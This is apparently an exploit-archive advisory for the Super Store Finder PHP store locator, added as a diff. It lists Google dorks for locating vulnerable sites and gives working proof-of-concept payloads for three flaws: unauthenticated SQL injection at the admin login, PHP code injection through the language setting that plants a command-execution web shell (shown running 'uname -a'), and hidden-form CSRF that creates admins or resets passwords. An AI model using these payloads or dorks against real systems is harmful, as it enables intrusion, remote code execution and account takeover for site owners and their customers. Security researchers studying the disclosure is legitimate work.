@@ -1,0 +1,138 @@
+id: 39372
+date: 02/27/2024
+title: SuperStoreFinder - Multiple Vulnerabilities
+author: bRpsd
+cves: 
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+ .:. Exploit Title > SuperStoreFinder - Multiple Vulnerabilities
+
+.:. Google Dorks .:.
+"designed and built by Joe Iz."
+"Super Store Finder is designed and built by Joe Iz from Highwarden Huntsman."
+inurl:/superstorefinder/index.php
+
+.:. Exploit Author: bRpsd
+.:. Contact: cy[at]live.no
+.:. Vendor -> https://www.superstorefinder.net/
+.:. Product -> https://codecanyon.net/item/super-store-finder/3630922
+.:. Product Version -> [3.7 and below]
+.:. DBMS -> MySQL
+.:. Tested on > macOS [*nix Darwin Kernel], on local xampp
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+ #############
+ |DESCRIPTION|
+ #############
+"Super Store Finder is a multi-language fully featured PHP/Javascript/MySQL store locator script integrated with the latest Google Maps API that allows customers to locate your stores easily. Packed with great features such as Geo Location, Drag and Drop Marker, Bulk Import and Geo code, Google Street View, Google Maps Direction and it is customizable and stylable (with extensible themes/add-ons, custom colors and maps design using snazzymaps.com). The store finder will be able to list nearby stores / outlets around your web visitors from nearest to the furthest distance away. Your customers will never be lost again getting to your stores / locations"
+
+
+
+
+
+
+Vulnerability 1: Unauthenticated SQL Injection
+Types: boolean-based blind,error-based, time-based blind
+File: localhost/admin/index.php
+Vul Parameter: USERNAME [POST]
+
+===========================================================================================
+Vulnerability 1: Unauthenticated SQL Injection
+Types: boolean-based blind,error-based, time-based blind
+File: localhost/admin/index.php
+Vul Parameter: USERNAME [POST]
+
+
+
+Test #1
+
+http://localhost:9000/adminstorefinder/admin/index.php
+
+username=a'&password=1&btn_login=Login
+
+Response Error:
+Array
+(
+    [0] => Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1
+)
+SELECT users.* FROM users WHERE users.username='admin''
+===========================================================================================
+
+Test #2 => Payload (Proof Of Concept)
+
+http://localhost:9000/adminstorefinder/admin/index.php
+
+username=a' AND GTID_SUBSET(CONCAT(0x7162766b71,(SELECT (CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END)),0x7170707071),3239)-- Seaj
+&password=1&btn_login=Login
+
+
+Response Error:
+Array
+(
+    [0] => Invalid query: FUNCTION adminstorefinder.JSON_STORAGE_FREE does not exist
+)
+===========================================================================================
+
+
+
+======================================================================================================================================================================================
+Vulnerability 2: Authenticated PHP Injection - Remote Code Exectuion
+File: localhost/admin/settings.php
+Vul Parameter: language_set [POST]
+
+
+Proof of concept:
+http://localhost:9000/superstorefinder/admin/settings.php
+langset=en_US&language_set=en_US');!isset($_GET['cmd'])?:system($_GET['cmd']);//&distance_set=mi&init_zoom=0&zoomhere_zoom=0&geo_settings=0&default_location=New York, US&style_map_color=rgba(0,0,0,1)&style_map_code=94102&style_top_bar_bg=rgba(0,0,0,1)&style_top_bar_font=rgba(0,0,0,1)&style_top_bar_border=rgba(0,0,0,1)&style_results_bg=rgba(0,0,0,1)&style_results_hl_bg=rgba(0,0,0,1)&style_results_hover_bg=rgba(0,0,0,1)&style_results_font=rgba(0,0,0,1)&style_results_distance_font=rgba(0,0,0,1)&style_distance_toggle_bg=rgba(0,0,0,1)&style_contact_button_bg=rgba(0,0,0,1)&style_contact_button_font=rgba(0,0,0,1)&style_button_bg=rgba(0,0,0,1)&style_button_font=rgba(0,0,0,1)&style_list_number_bg=rgba(0,0,0,1)&style_list_number_font=rgba(0,0,0,1)&save=1
+
+
+Index.php included in the config.inc.php , we just can go for rce
+with GET parameter ?cmd=
+
+
+http://localhost:9000/?cmd=uname -a
+
+Reponse:
+22.2.0 Darwin Kernel Version 22.2.0: Fri Nov 11 02:08:47 PST 2022; root:xnu-8792.61.2~4/RELEASE_X86_64 x86_64
+===========================================================================================
+
+
+
+
+===========================================================================================
+Vulnerability 3: Cross Site Request Forgery
+Risk: It can lead to Privilege Escalation through adding admins or changing admin password.
+Affected Files (1): localhost/superstorefinder/admin/users_add.php
+Parameters: username,password,cpassword
+
+Proof of concept:
+<iframe style="display:none" name="CSRF"></iframe>
+    <form method='POST' action='http://localhost:9000/superstorefinder/admin/users_add.php' target="CSRF" id="CSRF">
+      <input name="submit_hidden" value="submit_hidden" type="hidden" />
+      <input type='hidden' name='username' value='X'>
+        <input type='hidden' name='password' value='123'>
+      <input type='hidden' name='cpassword' value='123'>
+      <input type='hidden' value='submit'>
+    </form>
+    <script>document.getElementById("CSRF").submit()</script>
+      <iframe src='http://localhost:9000/superstorefinder/admin/logout.php' width='0' height='0'></iframe>
+
+
+
+
+Affected Files (2:):localhost/superstorefinder/admin/change_password.php
+Parameters: password,cpassword,save
+
+Proof of concept:
+<iframe style="display:none" name="CSRF"></iframe>
+    <form method='POST' action='http://localhost:9000/superstorefinder/admin/users_add.php' target="CSRF" id="CSRF">
+      <input type='hidden' name='password' value='123'>
+        <input type='hidden' name='cpassword' value='123'>
+      <input type='hidden' name="save=" value='save'>
+    </form>
+    <script>document.getElementById("CSRF").submit()</script>
+      <iframe src='http://localhost:9000/superstorefinder/admin/logout.php' width='0' height='0'></iframe>
+    ======================================================================================
+
+#  0day.today [2024-02-28]  #
